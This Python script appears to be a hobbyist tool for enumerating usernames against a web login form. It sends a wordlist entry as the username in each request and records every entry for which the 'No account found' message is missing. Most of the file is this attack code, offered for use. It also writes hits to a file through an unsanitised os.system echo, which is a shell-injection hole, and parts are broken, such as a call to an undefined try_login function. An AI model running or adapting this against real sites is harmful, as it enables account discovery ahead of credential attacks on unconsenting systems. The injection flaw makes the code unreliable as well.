'''
GNU General Public License v3.0

Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
Everyone is permitted to copy and distribute verbatim copies
of this license document, but changing it is not allowed.

by mopx
'''

import requests
import threading
import logging
import sys
import os
import copy
import uuid
import time
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import as_completed


URL_LOGIN = ''

def err(msg): print('\n ops... error > %s' % msg); exit(1)

class CustomRequests(threading.Thread):

    headers_class = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
        'Accept-Encoding': 'gzip, deflate'
    }

    def __init__(self, method_req='POST', url='', pattern='', payload='', datapost=None, headers=None):
        super(CustomRequests, self).__init__()
        self.kill = threading.Event()

        self.headers = headers if headers is not None else copy.deepcopy(self.headers_class)
        self.url = url
        self.datapost = datapost
        self.method_req = method_req
        if self.method_req == 'POST': self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

        self.pattern = pattern
        # implementar uso de cookies

    def start(self): self.run()

    def run(self):
        while not self.kill.is_set():
            try:
                sys.stdout.write('\r try > %s %s' % (self.datapost, ' '*40))
                response = requests.request(self.method_req.upper(), self.url, headers=self.headers, data=self.datapost, timeout=5)

                if response.status_code == 200:
                    logging.info(' [+] sucessful request with response code "%s" and datapost="%s"' % (response.status_code, self.datapost))
                else:
                    logging.info(' [!] request.status_code "%s"  with datapost "%s"' % (response.status_code, self.datapost))

                if self.pattern not in response.text:
                    os.system('echo "%s" >> ok.txt' % self.datapost)
                    print(' ✔️ aqui -> %s' % self.datapost)

            except Exception as err:
                logging.error(' [-] error to requesto at "%s" with datapost "%s"' % (self.url, self.datapost))
                logging.error(' error %s' % err)
            else:
                break

    def stop(self):
        # eh ist, fim da linha thread...
        self.kill.set()


def load_wordlist(path):
    fp = open(path, mode='r', errors='ignore')
    lines = fp.readlines()
    fp.close()
    return list(map(lambda x: x.replace('\n', ''), lines))


def main(payloads):
    with ThreadPoolExecutor(max_workers=5) as executor:
        return executor.map(try_login, payloads, timeout=30)



if __name__ == '__main__':
    logging.getLogger('requests').setLevel(logging.WARNING)
    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s', filename='tool0fuzz.log', filemode='a+')

    pattern = 'No account found with that username.'

    try:
        if len(sys.argv) >= 2:
            print('☄️ hi, friend! fuzz.py - init 💤 ')

            if not os.path.isfile(sys.argv[1]): err('wordlist path not found 🐤')
            wordlist = load_wordlist(sys.argv[1])

            threads = dict()
            list_active_threads = []

            try:
                for payload in wordlist:

                    while len(list_active_threads) >= 50:
                        print('\n max lenght threads [%s]' % len(threads))
                        for uid_thread, thread in threads.items():
                            if thread.is_alive() is False:
                                if thread in list_active_threads:
                                    list_active_threads.remove(thread)
                                ## del threads[uid_thread]
                        time.sleep(5)

                    payload = payload if len(payload) != 0 else 'test'
                    tmpdata = "username=FUZZ&password=password".replace('FUZZ', payload)
                    tmp = CustomRequests(url=URL_LOGIN, pattern=pattern, datapost=tmpdata)
 
                    threads[uuid.uuid4()] = tmp
                    list_active_threads.append(tmp)
                    tmp.start()

                    for uid_thread, thread in threads.items():
                        if thread.is_alive() is False:
                            if thread in list_active_threads:
                                list_active_threads.remove(thread)
                            ## del threads[uid_thread]
                print('\n 🦘 eh isto, quem achou achou, quem não paciência...')

            except Exception as e:
                print(' 🔊 error main function > %s' % e)
        else:
            print(' usage: %s %s' % (sys.argv[0], 'wordlist'))

    except KeyboardInterrupt:
        sys.stdout.write('\n\r ok ok, vou terminar aqui...')
    except Exception as e:
        print(' ops...error -> %s' % e)
